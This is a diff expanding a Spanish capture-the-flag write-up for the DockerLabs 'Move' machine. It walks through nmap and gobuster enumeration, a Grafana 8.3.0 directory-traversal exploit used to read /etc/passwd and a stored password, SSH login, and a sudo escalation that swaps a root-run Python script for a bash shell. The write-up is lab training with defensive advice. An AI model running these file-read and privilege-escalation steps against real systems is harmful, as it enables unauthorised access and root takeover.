@@ -1,76 +1,231 @@
-# MOVE — DockerLabs
+# Move — DockerLabs
 
 **Plataforma:** DockerLabs  
 **Dificultad:** 🟢 Fácil  
 **SO:** Linux  
+**Autor de la máquina:** El Pingüino de Mario  
+**Fecha de creación:** 30/06/2024  
+**Técnicas:** Grafana LFI · Directory Traversal · Searchsploit · SSH · Python sudo abuse
 
 ---
 
-## Resumen
+## Índice
 
-Resolución de la máquina **MOVE** de DockerLabs.
+1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
+2. [Enumeración web — Gobuster](#2-enumeración-web--gobuster)
+3. [Grafana 8.3.0 — explotación LFI](#3-grafana-830--explotación-lfi)
+4. [Acceso SSH](#4-acceso-ssh)
+5. [Escalada de privilegios](#5-escalada-de-privilegios)
+6. [Lección aprendida](#6-lección-aprendida)
 
 ---
 
-## 1. Reconocimiento
+## 1. Despliegue y reconocimiento
 
-Vamos a desplegar la maquina
+Desplegamos la máquina vulnerable:
 
-Hacemos un escaneo rápido con -Pn por si no permite las conexiones ping el
-servidor
+```bash
+sudo bash auto_deploy.sh move.tar
+```
 
-Ahora que sabemos los puertos abiertos, vamos a buscar la versión de cada uno
-con -sCV
+> IP asignada: `172.17.0.2`
 
-## 2. Enumeración
+Realizamos un escaneo rápido:
 
-Como tenemos un servidor apache vamos a hacer un escaneo de directorios con
-gobuster
+```bash
+nmap -Pn 172.17.0.2
+```
 
-Vemos como tenemos un fichero, así que lo vamos a ver.
+Resultado:
 
-Ahora vamos a ver que contiene el puerto 3000 y vemos que es grafana y cuenta
-con la versión 8.3.0
+```text
+21/tcp open ftp
+22/tcp open ssh
+80/tcp open http
+3000/tcp open ppp
+```
 
-## 3. Explotación
+Enumeramos versiones:
 
-Vamos a buscar a ver si existe algún exploit que podamos aprovechar
+```bash
+nmap -p21,22,80,3000 -sCV -Pn 172.17.0.2
+```
 
-Vamos a localizar ese exploit y lo copiaremos para ejecutarlo en nuestra maquina
+Servicios detectados:
 
-Para ver como funciona vamos a ejecutarlo con -h y vemos que simplemente
-tenemos que colocar el host a donde va dirigido el exploit.
+```text
+vsftpd 3.0.3
+OpenSSH 9.6p1
+Apache httpd 2.4.58
+Grafana 8.3.0
+```
 
-## 4. Post-explotación
+---
 
-Una vez ejecutado nos permite leer ficheros, vamos primero a leer el passwd para
-ver con que usuarios contamos, vemos que tenemos un usuario llamado freddy
+## 2. Enumeración web — Gobuster
 
-Si recordamos en maintenance.txt nos decía que la contraseña se encontraba en
-/tmp/pass.txt así que veremos que tiene este fichero.
+Como el servidor utiliza Apache realizamos enumeración de directorios:
 
-Ya que parece una contraseña intentaremos directamente acceder con eso al
-usuario freddy que encontramos
+```bash
+sudo gobuster dir -u http://172.17.0.2 \
+-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
+-x php,html,py,txt
+```
+
+Encontramos:
+
+```text
+/maintenance.html
+```
+
+Contenido:
+
+```text
+Website under maintenance, access is in /tmp/pass.txt
+```
+
+También observamos que el puerto `3000` corresponde a Grafana.
+
+---
+
+## 3. Grafana 8.3.0 — explotación LFI
+
+Buscamos exploits disponibles:
+
+```bash
+searchsploit Grafana 8.3.0
+```
+
+Resultado:
+
+```text
+Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
+```
+
+Localizamos el exploit:
+
+```bash
+locate multiple/webapps/50581.py
+```
+
+Copiamos el exploit:
+
+```bash
+cp /usr/share/exploitdb/exploits/multiple/webapps/50581.py .
+```
+
+Mostramos ayuda:
+
+```bash
+python3 50581.py -h
+```
+
+Leemos `/etc/passwd`:
+
+```bash
+python3 50581.py -H http://172.17.0.2:3000 /etc/passwd
+```
+
+Usuario encontrado:
+
+```text
+freddy
+```
+
+Leemos el fichero mencionado anteriormente:
+
+```bash
+python3 50581.py -H http://172.17.0.2:3000 /tmp/pass.txt
+```
+
+Resultado:
+
+```text
+t9SH76pQ82UFeZ3GXZS
+```
+
+---
+
+## 4. Acceso SSH
+
+Probamos la contraseña encontrada con el usuario `freddy`:
+
+```bash
+ssh freddy@172.17.0.2
+```
+
+Acceso correcto.
+
+Comprobamos privilegios sudo:
+
+```bash
+sudo -l
+```
+
+Resultado:
+
+```text
+(root) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
+```
+
+---
 
 ## 5. Escalada de privilegios
 
-Vemos que nos registramos sin problema, así que ahora queda la escalada de
-privilegios, ejecutamos sudo -l y vemos que tenemos permiso de ejecutar como
-administrador un archivo .py
+Eliminamos el script original:
 
-Lo que haremos será eliminar este archivo y crear uno con el mismo con el código
-que nosotros queramos
+```bash
+cd /opt
+rm -r maintenance.py
+```
 
-Vamos a ejecutar el siguiente script que esto nos permite abrir una nueva Shell
-desde bash
+Creamos uno nuevo:
 
-## 6. Lección aprendida
+```python
+import os
+os.system("/bin/bash")
+```
 
-Esta máquina enseña a encadenar técnicas de reconocimiento, enumeración y explotación para comprometer un sistema Linux y escalar hasta root.
+Damos permisos:
 
-> 💡 **Consejo para principiantes:** Si te atascas, vuelve al paso de enumeración — casi siempre hay algo que no viste la primera vez.
+```bash
+chmod +x maintenance.py
+```
+
+Ejecutamos el script como root:
+
+```bash
+sudo /usr/bin/python3 /opt/maintenance.py
+```
+
+Verificamos privilegios:
+
+```bash
+whoami
+root
+```
+
+✅ Somos **root**.
 
 ---
 
-*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs*  
-*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
+## 6. Lección aprendida
+
+| Vulnerabilidad | Impacto |
+|----------------|---------|
+| Grafana vulnerable a LFI | Lectura arbitraria de archivos |
+| Credenciales expuestas en archivos temporales | Acceso SSH |
+| Script Python ejecutable con sudo | Escalada de privilegios |
+| Permisos inseguros sobre scripts | Ejecución arbitraria |
+
+**Para defenderse:**
+
+- Mantener Grafana actualizado.
+- Evitar almacenar contraseñas en texto plano.
+- Restringir permisos sudo innecesarios.
+- Proteger scripts ejecutados con privilegios elevados.
+
+---
+
+*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
+*¿Te ha ayudado? Dale una ⭐ al repositorio.*
